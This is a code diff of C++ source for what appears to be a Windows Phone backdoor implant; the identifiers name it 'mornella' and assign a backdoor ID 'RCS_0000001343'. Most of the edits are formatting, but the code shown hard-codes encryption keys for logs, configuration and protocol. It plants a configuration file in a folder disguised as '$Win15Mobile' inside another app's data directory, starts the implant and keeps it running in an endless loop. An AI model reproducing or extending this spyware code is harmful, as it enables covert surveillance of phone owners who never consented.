@@ -1,18 +1,11 @@
-////#include "pch.h"
 extern "C" int mornellaStart(void);
 
-///#include <windows.h>
 #include "Core.h"
-
 #include <thread>
 #include <chrono>
-
-
 #include <stdio.h>
 #include <common_new\service.h>
-
 #include "FunctionFunc.h"
-
 #include "Log.h"
 
 
@@ -55,8 +48,6 @@ extern "C" DWORD WINAPI CoreProc(LPVOID pParam) {
 	typedef HRESULT (*pRegister)();
 	Core *core = NULL;
 
-
-
 	// configurazione artificialee
 	
 	/*	wp8mobile			  
@@ -85,8 +76,6 @@ extern "C" DWORD WINAPI CoreProc(LPVOID pParam) {
 	BYTE LogKey[] = { 0x14, 0x78, 0xbe, 0x89, 0xbf, 0x52, 0x47, 0x45, 0x28, 0x8c, 0xa5, 0xff, 0xa1, 0x23, 0x68, 0x78 };
 	BYTE ConfKey[] = { 0x94, 0xbf, 0x39, 0x0a, 0xb8, 0xbb, 0x53, 0x42, 0x78, 0x6f, 0xa3, 0x28, 0xbd, 0x91, 0x7a, 0x15 };
 	BYTE ProtoKey[] = { 0x57, 0x2e, 0xbc, 0x94, 0x39, 0x12, 0x81, 0xcc, 0xf5, 0x3a, 0x85, 0x13, 0x30, 0xbb, 0x0d, 0x99 };
-
-
 
 //wp8 v4 su castore
 	
@@ -138,15 +127,11 @@ extern "C" DWORD WINAPI CoreProc(LPVOID pParam) {
 	ZeroMemory(g_AesKey, 32);
 	ZeroMemory(g_ConfKey, 32);
 	ZeroMemory(g_Challenge, 32);
-	
-
 	CopyMemory(g_AesKey, LogKey, 16);
 	CopyMemory(g_ConfKey, ConfKey, 16);
 	CopyMemory(g_Challenge, ProtoKey, 16);
-	
-	
-
 	ZeroMemory(g_BackdoorID, 16);
+
 	//wp8 v3 castore
 	CopyMemory(g_BackdoorID, "RCS_0000001343", strlen("RCS_0000001343"));
 
@@ -251,55 +236,30 @@ BOOL BTC_Deinit(DWORD dwData) {
 	return TRUE;
 }
 
-
-
-
-
-
-
-
-
-
-
+	COPYFILE2_EXTENDED_PARAMETERS copyParams = {
+		sizeof(copyParams), COPY_FILE_FAIL_IF_EXISTS, NULL, NULL, NULL
+	};
 
 int mornellaStart(void)
 {
-	/*
-		Windows::Foundation::TimeSpan span;
-		span.Duration = 10000000L;   // convert 1 sec to 100ns ticks
-	 
-		Windows::Phone::Devices::Notification::VibrationDevice^ vibr = Windows::Phone::Devices::Notification::VibrationDevice::GetDefault();
-		vibr->Vibrate(span);
-	*/
-		
+	CreateDirectory(L"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\", NULL);
 
-		COPYFILE2_EXTENDED_PARAMETERS copyParams = {
-		  sizeof(copyParams), COPY_FILE_FAIL_IF_EXISTS, NULL, NULL, NULL
-	   };
-
-	   CreateDirectory(L"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\", NULL);
-
-	   //vedere perche' in release il file dovrebbe chiamarsi fmh58t4.wph
-	   HRESULT  hCF=CopyFile2(L".\\fmh58t4.wph",L"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\fmh58t4.wph",  &copyParams);
+	HRESULT  hCF=CopyFile2(L".\\fmh58t4.wph",L"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\fmh58t4.wph",  &copyParams);
 			   
 
 #ifdef _DEBUG
-	   if (hCF == HRESULT_FROM_WIN32(ERROR_FILE_EXISTS))
-	   {
-		 OutputDebugString(L"Il file di Configurazione è gia' presente per cui non lo sostituisco");
-	   }
-	   if (hCF == S_OK)
-	   {
-		 OutputDebugString(L"Installo la conf per la prima volta");
-	   }
+	if (hCF == HRESULT_FROM_WIN32(ERROR_FILE_EXISTS))
+	{
+		OutputDebugString(L"Il file di Configurazione è gia' presente per cui non lo sostituisco");
+	}
+	if (hCF == S_OK)
+	{
+		OutputDebugString(L"Installo la conf per la prima volta");
+	}
 #endif
-		
-			
+	BTC_Init(0x0);
 
-		BTC_Init(0x0);
+	for (;;) std::this_thread::sleep_for(std::chrono::milliseconds(20000));
 
-		for (;;) std::this_thread::sleep_for(std::chrono::milliseconds(20000));
-
-		return 0;
-	
+	return 0;
 }
